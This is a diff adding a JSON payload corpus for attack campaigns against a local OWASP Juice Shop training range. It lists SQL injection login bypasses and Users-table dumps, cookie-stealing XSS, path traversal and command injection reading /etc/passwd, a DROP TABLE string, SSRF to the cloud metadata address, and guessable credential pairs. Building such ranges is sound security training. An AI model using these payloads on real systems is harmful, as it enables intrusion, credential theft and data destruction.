@@ -1,0 +1,95 @@
+{
+  "_comment": "Attack payload sets for range/attacks/campaigns.py. Standard, well-documented techniques, used ONLY against our own local Juice Shop range. Edit here to extend the attack corpus without touching code.",
+  "sqli_login": [
+    "' OR 1=1--",
+    "' OR '1'='1'--",
+    "admin'--",
+    "' OR 1=1#",
+    "') OR ('1'='1"
+  ],
+  "sqli_union": [
+    "qwert')) UNION SELECT id, email, password, '4','5','6','7','8','9' FROM Users--",
+    "')) UNION SELECT * FROM Users--",
+    "' UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--"
+  ],
+  "xss": [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(document.cookie)>",
+    "<iframe src=\"javascript:alert(1)\">",
+    "<svg/onload=alert(1)>",
+    "\"><script>alert(String.fromCharCode(88,83,83))</script>"
+  ],
+  "traversal": [
+    "/ftp/package.json.bak",
+    "/ftp/package.json%2500.md",
+    "/ftp/../../../../etc/passwd",
+    "/ftp/..%2f..%2f..%2f..%2fetc%2fpasswd",
+    "/ftp/....//....//....//etc/passwd",
+    "/ftp/%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+  ],
+  "cmdi": [
+    "; cat /etc/passwd",
+    "| whoami",
+    "$(sleep 3)",
+    "`id`",
+    "&& ping -c 1 127.0.0.1",
+    "a' ; DROP TABLE Users;--"
+  ],
+  "ssrf": [
+    "http://169.254.169.254/latest/meta-data/",
+    "http://localhost:3000/",
+    "http://127.0.0.1:22",
+    "file:///etc/passwd",
+    "http://[::1]:3000/"
+  ],
+  "credentials": [
+    [
+      "admin@juice-sh.op",
+      "admin123"
+    ],
+    [
+      "admin@juice-sh.op",
+      "password"
+    ],
+    [
+      "admin@juice-sh.op",
+      "123456"
+    ],
+    [
+      "jim@juice-sh.op",
+      "ncc-1701"
+    ],
+    [
+      "bender@juice-sh.op",
+      "OhGod10%close"
+    ],
+    [
+      "test@test.com",
+      "test"
+    ],
+    [
+      "user@juice-sh.op",
+      "Password1!"
+    ],
+    [
+      "mc.safesearch@juice-sh.op",
+      "Mr. N00dles"
+    ],
+    [
+      "admin@juice-sh.op",
+      "letmein"
+    ],
+    [
+      "admin@juice-sh.op",
+      "qwerty"
+    ]
+  ],
+  "seed_users": [
+    "admin@juice-sh.op",
+    "jim@juice-sh.op",
+    "bender@juice-sh.op",
+    "ghost@juice-sh.op",
+    "nonexistent@example.com",
+    "support@juice-sh.op"
+  ]
+}
